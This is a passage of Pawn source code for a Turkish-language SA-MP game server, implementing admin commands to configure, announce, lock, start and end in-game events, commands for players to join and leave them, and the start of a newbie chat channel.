					SendClientMessage(playerid, COLOR_WHITE, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent team1skin [skinid]");
					return 1;
				}

				new skin;
				skin = strval(opstring);
				EventInfo[EventTeamSkin][0] = skin;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik takýmý 1'in skinini ayarladýn.");
			}
			else if(strcmp(choice, "team2skin", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent team2skin [skinid]");
					return 1;
				}

				new skin;
				skin = strval(opstring);
				EventInfo[EventTeamSkin][1] = skin;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik takýmý 2'nin skinini ayarladýn.");
			}
			else if(strcmp(choice, "team1color", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!strlen(opstring))
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent team1color [color]");
					SendClientMessage(playerid, COLOR_GREY, "black | white | blue | red | green | purple | yellow | lightblue |");
					SendClientMessage(playerid, COLOR_GREY, "darkgreen | darkblue | darkgrey | brown | darkbrown | darkred | pink ");
					return 1;
				}
				EventInfo[EventTeamColor][0] = GetColorCode(opstring);
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik takýmý 1'in rengini ayarladýn.");
			}
			else if(strcmp(choice, "team2color", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!strlen(opstring))
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent team2color [color]");
					SendClientMessage(playerid, COLOR_GREY, "black | white | blue | red | green | purple | yellow | lightblue |");
					SendClientMessage(playerid, COLOR_GREY, "darkgreen | darkblue | darkgrey | brown | darkbrown | darkred | pink ");
					return 1;
				}
				EventInfo[EventTeamColor][1] = GetColorCode(opstring);
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik takýmý 2'nin rengini ayarladýn.");
			}
			else if(strcmp(choice, "team1spawn", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}
				EventInfo[EventWorld] = GetPlayerVirtualWorld(playerid);
				EventInfo[EventInterior] = GetPlayerInterior(playerid);
				GetPlayerPos(playerid, EventInfo[EventTeamPosX1], EventInfo[EventTeamPosY1], EventInfo[EventTeamPosZ1]);
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik takýmý 1'in çýkma pozisyonunu ayarladýn.");
			}
			else if(strcmp(choice, "team2spawn", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu özellik bu etkinlik tipi için kullanýlamaz.");
					return 1;
				}
				EventInfo[EventWorld] = GetPlayerVirtualWorld(playerid);
				EventInfo[EventInterior] = GetPlayerInterior(playerid);
				GetPlayerPos(playerid, EventInfo[EventTeamPosX2], EventInfo[EventTeamPosY2], EventInfo[EventTeamPosZ2]);
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik takýmý 2'nin çýkma pozisyonunu ayarladýn.");
			}
			else if(strcmp(choice, "limit", true) == 0)
			{
			    if(EventInfo[EventTime] != 0)
			        return SendClientMessage(playerid, COLOR_GRAD2, "Bu özellik bu etkinlik için kullanýlamaz, herkes girebilir. Aktifleþtirmek için saati 0'a ayarla.");
				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent limit [limit 0-60]");
					return 1;
				}

				new limit;
				limit = strval(opstring);
				if(limit < 0 || limit > 60) return SendClientMessage(playerid, COLOR_RED, "Etkinlik limiti 0-60 arasýdýr.");
				EventInfo[EventLimit] = limit;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlikteki oyuncu limitini ayarladýn.");
			}
			else if(strcmp(choice, "gun1", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent gun1 [weaponid]");
					return 1;
				}

				new weapon;
				weapon = strval(opstring);
				if(weapon == 16 || weapon == 18 || weapon == 35 || weapon == 37 || weapon == 38 || weapon == 39) return SendClientMessage(playerid, COLOR_WHITE, "Bu silah etkinlik silahý olarak ayarlanamaz!");
				EventInfo[EventWeapons][0] = weapon;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik silahý 1'i ayarladýn.");
			}
			else if(strcmp(choice, "gun2", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent gun1 [weaponid]");
					return 1;
				}

				new weapon;
				weapon = strval(opstring);
				if(weapon == 16 || weapon == 18 || weapon == 35 || weapon == 37 || weapon == 38 || weapon == 39) return SendClientMessage(playerid, COLOR_WHITE, "Bu silah etkinlik silahý olarak ayarlanamaz!");
				EventInfo[EventWeapons][1] = weapon;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik silahý 2'yi ayarladýn.");
			}
			else if(strcmp(choice, "gun3", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent gun1 [weaponid]");
					return 1;
				}

				new weapon;
				weapon = strval(opstring);
				if(weapon == 16 || weapon == 18 || weapon == 35 || weapon == 37 || weapon == 38 || weapon == 39) return SendClientMessage(playerid, COLOR_WHITE, "Bu silah etkinlik silahý olarak ayarlanamaz!");
				EventInfo[EventWeapons][2] = weapon;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik silahý 3'ü ayarladýn.");
			}
			else if(strcmp(choice, "gun4", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent gun1 [weaponid]");
					return 1;
				}

				new weapon;
				weapon = strval(opstring);
				if(weapon == 35 || weapon == 37 || weapon == 38) return SendClientMessage(playerid, COLOR_WHITE, "Bu silah etkinlik silahý olarak ayarlanamaz!");
				EventInfo[EventWeapons][3] = weapon;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik silahý 4'ü ayarladýn.");
			}
			else if(strcmp(choice, "gun5", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent gun1 [weaponid]");
					return 1;
				}

				new weapon;
				weapon = strval(opstring);
				if(weapon == 35 || weapon == 37 || weapon == 38) return SendClientMessage(playerid, COLOR_WHITE, "Bu silah etkinlik silahý olarak ayarlanamaz!");
				EventInfo[EventWeapons][4] = weapon;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik silahý 5'i ayarladýn.");
			}
		}
	}
	return 1;
}

CMD:endevent(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(EventInfo[EventStatus] != 0)
		{
			foreach(Player, i)
			{
				if(GetPVarInt(i, "EventToken") == 1) {
				    if(EventInfo[EventType] == 3) {
						DisablePlayerCheckpoint(i);
					} else {
						ResetPlayerWeapons(i);
						SetPlayerWeapons(i);
						SetPlayerToTeamColor(i);
						SetPlayerTeam(i, -1);
						EventTeam[i] = -1;
						SetPlayerSkin(i, PlayerInfo[i][pSkin]);
						SetPlayerPos(i,EventFloats[i][1],EventFloats[i][2],EventFloats[i][3]);
						if(EventLastInt[i] > 0 || EventLastVW[i] > 0) {
							LoadObjectsForPlayer(i);
						}
						SetPlayerVirtualWorld(i, EventLastVW[i]);
						SetPlayerFacingAngle(i, EventFloats[i][0]);
						SetPlayerInterior(i,EventLastInt[i]);
						SetPlayerHealth(i, EventFloats[i][4]);
						SetPlayerArmourEx(i, EventFloats[i][5]);
						for(new d = 0; d < 6; d++)
						{
							EventFloats[i][d] = 0.0;
						}
						EventLastVW[i] = 0;
						EventLastInt[i] = 0;
					}
					DeletePVar(i, "EventAnims");
					DeletePVar(i, "EventToken");
					SendClientMessage(i, COLOR_YELLOW, "Bir etkinlikten çýkarýldýn, Etkinlik admin tarafýndan sonlandýrýldý.");
				}
			}

			EventInfo[EventPositionX] = 0;
			EventInfo[EventPositionY] = 0;
			EventInfo[EventPositionZ] = 0;
			EventInfo[EventTeamPosX1] = 0;
			EventInfo[EventTeamPosY1] = 0;
			EventInfo[EventTeamPosZ1] = 0;
			EventInfo[EventTeamPosX2] = 0;
			EventInfo[EventTeamPosY2] = 0;
			EventInfo[EventTeamPosZ2] = 0;
			EventInfo[EventStatus] = 0;
			EventInfo[EventType] = 0;
			EventInfo[EventHealth] = 0;
			EventInfo[EventLimit] = 0;
			EventInfo[EventPlayers] = 0;
			EventInfo[EventWeapons][0] = 0;
			EventInfo[EventWeapons][1] = 0;
			EventInfo[EventWeapons][2] = 0;
			EventInfo[EventWeapons][3] = 0;
			EventInfo[EventWeapons][4] = 0;
			EventInfo[EventCreator] = 999;
			EventInfo[VipOnly] = 0;
			EventInfo[EventJoinStaff] = 0;
			EventInfo[EventFaction] = 0;
			EventInfo[EventFamily] = 255;
			EventInfo[EventToggleHeal] = 0;
			EventInfo[EventToggleAnims] = 0;
			SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* Etkinlik admin tarafýndan bitirildi.");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Þu an aktif bir etkinlik yok.");
		}

	}
	return 1;
}

CMD:startevent(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4){
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

		if(EventInfo[EventStatus] == 0) {
			if(PlayerInfo[playerid][pAdmin] >= 4)
			{
				if(EventInfo[EventHealth] == 0)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Etkinlik canýný ayarlamadýn!");
					return 1;
				}
				if((EventInfo[EventPositionX] == 0 || EventInfo[EventPositionY] == 0 || EventInfo[EventPositionZ] == 0) && EventInfo[EventType] != 3)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Etkinlik pozisyonunu ayarlamadýn!");
					return 1;
				}
				if((EventInfo[EventTeamPosX1] == 0 || EventInfo[EventTeamPosY1] == 0 || EventInfo[EventTeamPosZ1] == 0) && EventInfo[EventType] == 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Takým 1'in çýkma pozisyonunu ayarlamadýn!");
					return 1;
				}
				if((EventInfo[EventTeamPosX2] == 0 || EventInfo[EventTeamPosY2] == 0 || EventInfo[EventTeamPosZ2] == 0) && EventInfo[EventType] == 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Takým 2'nin çýkma pozisyonunu ayarlamadýn!");
					return 1;
				}
				if(EventInfo[EventLimit] == 0)
				{
					EventInfo[EventLimit] = 60;
				}
				EventInfo[EventStatus] = 1;
				SendClientMessage(playerid, COLOR_GRAD2, "Bir etkinlik baþlattýn, /announceevent ile etkinliði tüm sunucuya duyur.");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Zaten aktif bir etkinlik var.");
		}
	}

	return 1;
}

CMD:announceevent(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid) {
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

		new
			szMessage[128];
		if(EventInfo[EventStatus] == 1) {
			if(EventInfo[EventFaction] > 0 && EventInfo[EventFamily] == 255 && EventInfo[EventFaction] != 1337) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "Etkinliði kitlemek için /lockevent");
				format(szMessage, sizeof(szMessage), "* %s için Admin tarafýndan etkinlik baþlatýldý, /etkgit ile katýl.", GetFactionName(EventInfo[EventFaction]));
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, szMessage);
			} else if(EventInfo[EventFamily] < 255 && EventInfo[EventFaction] == 0 && EventInfo[EventFamily] != 1337) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "Etkinliði kitlemek için /lockevent");
				format(szMessage, sizeof(szMessage), "* %s için Admin tarafýndan etkinlik baþlatýldý, /etkgit ile katýl.", FamilyInfo[EventInfo[EventFamily]][FamilyName]);
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, szMessage);
			} else if(EventInfo[EventFaction] == 1337 && EventInfo[EventFamily] == 255) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "Etkinliði kitlemek için /lockevent");
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* Kuruluþlar için Admin tarafýndan etkinlik baþlatýldý, /etkgit ile katýl.");
			} else if(EventInfo[EventFamily] == 1337 && EventInfo[EventFaction] == 0) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "Etkinliði kitlemek için /lockevent");
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* Aileler için Admin tarafýndan etkinlik baþlatýldý, /etkgit ile katýl.");
			} else if(EventInfo[EventFaction] == 1337 && EventInfo[EventFamily] == 1337) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "Etkinliði kitlemek için /lockevent");
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* Aileler ve kuruluþlar için Admin tarafýndan etkinlik baþlatýldý, /etkgit ile katýl.");
			} else if(EventInfo[EventFaction] > 0 && EventInfo[EventFamily] < 255 && EventInfo[EventFaction] != 1337 && EventInfo[EventFamily] != 1337) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "Etkinliði kitlemek için /lockevent");
				format(szMessage, sizeof(szMessage), "* %s ve %s için etkinlik baþlatýldý, /etkgit ile katýl.", FamilyInfo[EventInfo[EventFamily]][FamilyName], GetFactionName(EventInfo[EventFaction]));
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, szMessage);
			} else {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "Etkinliði kitlemek için /lockevent");
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* Admin tarafýndan bir etkinlik baþlatýldý, /etkgit ile katýl.");
			}
		} else SendClientMessage(playerid, COLOR_WHITE, "Zaten aktif bir etkinlik var.");
	}
	return 1;
}

CMD:lockevent(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(EventInfo[EventStatus] == 2)
		{
		    if(EventInfo[EventType] == 3 && EventInfo[EventTime] != 0)
				return SendClientMessage(playerid, COLOR_RED, "HATA: Bu özellik, bu etkinlik için ayarlanan konfigürasyonla kullanýlamaz.");

			EventInfo[EventStatus] = 3;
			SendClientMessage(playerid, COLOR_GRAD2, "Bir etkinliði kitledin, /beginevent ile resmi olarak etkinliði baþlat.");
			SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* Etkinlik admin tarafýndan kitlendi.");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Zaten aktif bir etkinlik var.");
		}
	}
	return 1;
}

CMD:beginevent(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(EventInfo[EventStatus] == 3) {
			EventInfo[EventStatus] = 4;

			foreach(Player, i) {
				if(GetPVarInt(i, "EventToken") == 1) {
					if(EventInfo[EventType] == 1) {
						SendClientMessage(i, COLOR_LIGHTBLUE, "HADI! Etkinlik baþladý.");
						SetPlayerHealth(i, EventInfo[EventHealth]);
						SetPlayerArmourEx(i, EventInfo[EventArmor]);
						for(new d = 0; d < sizeof(EventInfo[EventStaff]); d++) {
							if(i == EventInfo[EventStaff][d])
								SetPlayerHealth(i, 999999);
						}

						GivePlayerEventWeapons(i);
					}
					else if(EventInfo[EventType] == 2) {
						SendClientMessage(i, COLOR_LIGHTBLUE, "HADI! Etkinlik baþladý.");
						SetPlayerHealth(i, EventInfo[EventHealth]);
						SetPlayerArmourEx(i, EventInfo[EventArmor]);
						for(new d = 0; d < sizeof(EventInfo[EventStaff]); d++)
						{
							if(i == EventInfo[EventStaff][d])
							{
								SetPlayerHealth(i, 999999);
							}
						}
						GivePlayerEventWeapons(i);
					}
				}
				else
				{
					SendClientMessage(i, COLOR_WHITE, "Etkinlik baþladý. Baþka zaman katýlmak istersen /etkgit komutunu kullan.");
				}
			}

		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Yeni bir etkinlik açmak için /lockevent ile önce etkinliði kitle, ya da /endevent kullanarak mevcut etkinliði bitir.");
		}
	}
	return 1;
}

CMD:etkgit(playerid, params[]) {
	new
		szMessage[128];
	if(EventInfo[EventStatus] == 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Aktif bir etkinlik yok.");

	if(AdminDuty[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "Admin olarak iþbaþýndayken etkinliðe katýlamazsýn. /eventstaff kullan ya da iþbaþýný býrak.");

	if(GetPVarType(playerid, "posX") != 0)
		return SendClientMessage(playerid, COLOR_GREY, "Yardým isteðiyle ilgilendiðinden etkinliðe katýlamazsýn.");

	if(GetPVarInt(playerid, "EventToken") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "Zaten etkinliktesin.");

	if(GetPVarInt(playerid, "PBM") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");

	if(PlayerCuffed[playerid] >= 1 || PlayerInfo[playerid][pJailTime] > 0 || GetPVarInt(playerid, "Hospital") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");

	if(PlayerInfo[playerid][pConnectTime] < 2)
		return SendClientMessage(playerid, COLOR_GRAD2, "Genç padawan, Silah yasaklamasýndan dolayý 2 saat oynamadan önce etkinliðe katýlamazsýn.");

	if(EventInfo[EventPlayers] >= EventInfo[EventLimit] && EventInfo[EventTime] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "Etkinlik maksimum oyuncuya ulaþtý.");

	if(PlayerDragged[playerid] != 0 || IsCopDragging[playerid] != INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");

	if(EventInfo[EventFaction] > 0 && EventInfo[EventFamily] == 255 && EventInfo[EventFaction] != 1337 && EventInfo[EventFaction] != PlayerInfo[playerid][pFaction]) {
		format(szMessage, sizeof(szMessage), "Bu etkinlik sadece %s üyeleri için.", GetFactionName(EventInfo[EventFaction]));
		SendClientMessage(playerid, COLOR_GRAD2, szMessage);
		return 1;
	} else if(EventInfo[EventFamily] < 255 && EventInfo[EventFaction] == 0 && EventInfo[EventFamily] != 1337 && EventInfo[EventFamily] != PlayerInfo[playerid][pGang]) {
		format(szMessage, sizeof(szMessage), "Bu etkinlik sadece %s üyeleri için.", FamilyInfo[EventInfo[EventFamily]][FamilyName]);
		SendClientMessage(playerid, COLOR_GRAD2, szMessage);
		return 1;
	} else if(EventInfo[EventFaction] == 1337 && EventInfo[EventFamily] == 255 && PlayerInfo[playerid][pFaction] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "Bu etkinlik sadece kuruluþ üyeleri için.");
	else if(EventInfo[EventFamily] == 1337 && EventInfo[EventFaction] == 0 && PlayerInfo[playerid][pGang] == 255)
		return SendClientMessage(playerid, COLOR_GRAD2, "Bu etkinlik sadece aile üyeleri için.");
	else if(EventInfo[EventFaction] == 1337 && EventInfo[EventFamily] == 1337 && PlayerInfo[playerid][pGang] == 255 && PlayerInfo[playerid][pFaction] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "Bu etkinlik sadece aile ve kuruluþ üyeleri için.");
	else if(EventInfo[EventFaction] > 0 && EventInfo[EventFamily] < 255 && EventInfo[EventFaction] != 1337 && EventInfo[EventFamily] != 1337) {
		if(PlayerInfo[playerid][pGang] != EventInfo[EventFamily] && PlayerInfo[playerid][pFaction] != EventInfo[EventFaction]) {
			format(szMessage, sizeof(szMessage), "Bu etkinlik sadece %s ve %s üyeleri için.", FamilyInfo[EventInfo[EventFamily]][FamilyName], GetFactionName(EventInfo[EventFaction]));
			SendClientMessage(playerid, COLOR_GRAD2, szMessage);
			return 1;
		}
	} else { }

	if(EventInfo[EventStatus] == 2) {
		if(EventInfo[EventType] == 3)
		{
			// For down the road, racing
		}
		else
		{
			if(IsPlayerInAnyVehicle(playerid)) {
				return SendClientMessage(playerid, COLOR_GRAD2, "Araçtayken katýlamazsýn.");
			}

			SetPVarInt(playerid, "EventToken", 1);
			if(EventInfo[EventToggleAnims] == 1) SetPVarInt(playerid, "EventAnims", 1);
			ResetPlayerWeapons(playerid);
			pTazer[playerid] = 0;
			GetPlayerHealth(playerid, EventFloats[playerid][4]);
			GetPlayerArmour(playerid, EventFloats[playerid][5]);
			EventLastVW[playerid] = GetPlayerVirtualWorld(playerid);
			EventLastInt[playerid] = GetPlayerInterior(playerid);
			GetPlayerPos(playerid, EventFloats[playerid][1], EventFloats[playerid][2], EventFloats[playerid][3]);
			GetPlayerFacingAngle(playerid, EventFloats[playerid][0]);
			if(EventInfo[EventType] != 2)
			{
				SetPlayerPos(playerid, EventInfo[EventPositionX], EventInfo[EventPositionY], EventInfo[EventPositionZ]);
			}
			SetPlayerInterior(playerid, EventInfo[EventInterior]);
			SetPlayerVirtualWorld(playerid, EventInfo[EventWorld]);
			SendClientMessage(playerid, COLOR_WHITE, EventInfo[EventJT]);
			SetPlayerHealth(playerid, EventInfo[EventHealth]);
			SetPlayerArmourEx(playerid, EventInfo[EventArmor]);

			if(EventInfo[EventType] == 2)
			{
				SetPlayerSkin(playerid, EventInfo[EventTeamSkin][nextteam]);
				new color = EventInfo[EventTeamColor][nextteam];
				if(color==0) SetPlayerColor(playerid, 0x00000000);
				if(color==1) SetPlayerColor(playerid, 0xFFFFFF00);
				if(color==2) SetPlayerColor(playerid, 0x2641FE00);
				if(color==3) SetPlayerColor(playerid, 0xAA333300);
				if(color==16) SetPlayerColor(playerid, 0x33AA3300);
				if(color==5) SetPlayerColor(playerid, 0xC2A2DA00);
				if(color==6) SetPlayerColor(playerid, 0xFFFF0000);
				if(color==7) SetPlayerColor(playerid, 0x33CCFF00);
				//if(strcmp(clr, "navy", true)==0) color=94;
				//if(strcmp(clr, "beige", true)==0) color=102;
				if(color==51) SetPlayerColor(playerid, 0x2D6F0000);
				if(color==103) SetPlayerColor(playerid, 0x0B006F00);
				if(color==13) SetPlayerColor(playerid, 0x52525200);
				if(color==55) SetPlayerColor(playerid, 0xB46F0000);
				if(color==84) SetPlayerColor(playerid, 0x814F0000);
				if(color==74) SetPlayerColor(playerid, 0x750A0000);
				//if(strcmp(clr, "maroon", true)==0) color=115;
				if(color==126) SetPlayerColor(playerid, 0xFF51F100);
				if(nextteam == 0)
				{
					SetPlayerPos(playerid, EventInfo[EventTeamPosX1], EventInfo[EventTeamPosY1], EventInfo[EventTeamPosZ1]);
				}
				else
				{
					SetPlayerPos(playerid, EventInfo[EventTeamPosX2], EventInfo[EventTeamPosY2], EventInfo[EventTeamPosZ2]);
				}
				SetPlayerTeam(playerid, nextteam);
				EventTeam[playerid] = nextteam;

				if(nextteam == 0) nextteam++;
				else if(nextteam == 1) nextteam--;
			}
		}
		EventInfo[EventPlayers] ++;
		if(EventInfo[EventPlayers] == EventInfo[EventLimit] && EventInfo[EventTime] == 0)
		{
			ABroadCast(COLOR_YELLOW, "Etkinlik maksimum oyuncu sayýsýna ulaþtý, þimdi baþlatabilirsin.", 2);
		}
	}

	else if(EventInfo[EventStatus] == 3)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Etkinlik kilitlendi. Katýlamazsýn.");
	}
	else if(EventInfo[EventStatus] == 4)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Etkinlik baþlatýldý. Katýlamazsýn.");
	}
	return 1;
}

CMD:etkcik(playerid, params[])
{
    if(GetPVarInt(playerid, "EventToken") == 1) {
        if(EventInfo[EventStatus] == 1 || EventInfo[EventStatus] == 2)
		{
       		SendClientMessage(playerid, COLOR_WHITE, "Etkinliðin bu aþamasýnda çýkamazsýn.");
       		return 1;
		}
      	ResetPlayerWeapons(playerid);
		SetPlayerTeam(playerid, -1);
		EventTeam[playerid] = -1;
		DeletePVar(playerid, "EventToken");
		DeletePVar(playerid, "EventAnims");
       	SetPlayerWeapons(playerid);
       	SetPlayerToTeamColor(playerid);
       	SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
       	SetPlayerPos(playerid,EventFloats[playerid][1],EventFloats[playerid][2],EventFloats[playerid][3]);
      	SetPlayerVirtualWorld(playerid, EventLastVW[playerid]);
		if(EventLastInt[playerid] > 0 || EventLastVW[playerid] > 0) {
			LoadObjectsForPlayer(playerid);
		}
       	SetPlayerFacingAngle(playerid, EventFloats[playerid][0]);
       	SetPlayerInterior(playerid,EventLastInt[playerid]);
       	SetPlayerHealth(playerid, EventFloats[playerid][4]);
       	SetPlayerArmourEx(playerid, EventFloats[playerid][5]);
       	for(new i = 0; i < 6; i++) {
        	EventFloats[playerid][i] = 0.0;
        }
        EventLastVW[playerid] = 0;
        EventLastInt[playerid] = 0;
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Etkinlikten çýktýn.");
    }
    return 1;
}

CMD:newbie(playerid, params[]) {
	return cmd_n(playerid, params);
}

CMD:n(playerid, params[]) {
	if(gPlayerLogged[playerid] == 0)
		return SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýn.");

	if((nonewbie) && PlayerInfo[playerid][pAdmin] < 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "Newbie Sohbet Kanalý Admin tarafýndan kapatýldý!");

	if(gNewbie[playerid] == 1)
		return SendClientMessage(playerid, COLOR_GREY, "Kanalý kapadýn, /newbiekapatie ile tekrar aktifleþtir!");

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: (/newb)ie [text]");

	if(PlayerInfo[playerid][pNMute] == 1)
		return SendClientMessage(playerid, COLOR_GREY, "Newbie Sohbet Kanalýndan mutelendin.");

	new
		string[128];

	if(NewbieTimer[playerid] > 0) {
		format(string, sizeof(string), "Bu kanalda tekrar konuþabilmek için %d saniye beklemelisin.", NewbieTimer[playerid]);
		SendClientMessage(playerid, COLOR_GREY, string);
		return 1;
	}

	if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pHelper] < 2)
		NewbieTimer[playerid] = 45;

	if(AdminDuty[playerid] == 1)
	{
		if(PlayerInfo[playerid][pHelper] == 1)
			format(string, sizeof(string), "** Stajyer Helper %s: %s", GetPlayerNameEx(playerid), params);
	 	else if(PlayerInfo[playerid][pHelper] == 2)
			format(string, sizeof(string), "** Level 1 Helper %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] == 3)
			format(string, sizeof(string), "** Level 2 Helper %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] == 4)
			format(string, sizeof(string), "** Level 3 Helper %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] == 5)
			format(string, sizeof(string), "** Level 4 Helper %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] == 6)
			format(string, sizeof(string), "** Level 5 Helper %s: %s", GetPlayerNameEx(playerid), params);		
		else if(PlayerInfo[playerid][pAdmin] < 1)
			format(string, sizeof(string), "** Oyuncu %s: %s", GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pAdmin] == 1)
